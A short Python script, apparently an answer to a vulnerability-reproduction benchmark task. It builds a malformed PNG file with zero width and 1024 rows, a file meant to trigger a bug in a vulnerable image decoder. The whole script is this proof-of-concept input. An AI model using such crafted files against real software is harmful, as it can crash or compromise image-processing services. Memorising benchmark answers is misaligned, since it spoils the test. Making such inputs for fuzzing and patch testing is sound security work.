import struct
import zlib


class Solution:
    def solve(self, src_path: str) -> bytes:
        width = 0
        height = 1024  # non-zero height with zero width

        signature = b"\x89PNG\r\n\x1a\n"

        def make_chunk(typ: bytes, data: bytes) -> bytes:
            length = struct.pack(">I", len(data))
            crc = zlib.crc32(typ)
            crc = zlib.crc32(data, crc) & 0xFFFFFFFF
            return length + typ + data + struct.pack(">I", crc)

        ihdr_data = struct.pack(
            ">IIBBBBB",
            width,      # width = 0 (invalid, triggers bug in vulnerable version)
            height,     # non-zero height
            8,          # bit depth
            0,          # color type: grayscale
            0,          # compression method
            0,          # filter method
            0,          # interlace method
        )
        ihdr = make_chunk(b"IHDR", ihdr_data)

        # For width = 0 and grayscale, each scanline is just the filter byte.
        raw_image = b"\x00" * height  # one filter byte per row
        compressed = zlib.compress(raw_image, 9)
        idat = make_chunk(b"IDAT", compressed)

        iend = make_chunk(b"IEND", b"")

        return signature + ihdr + idat + iend
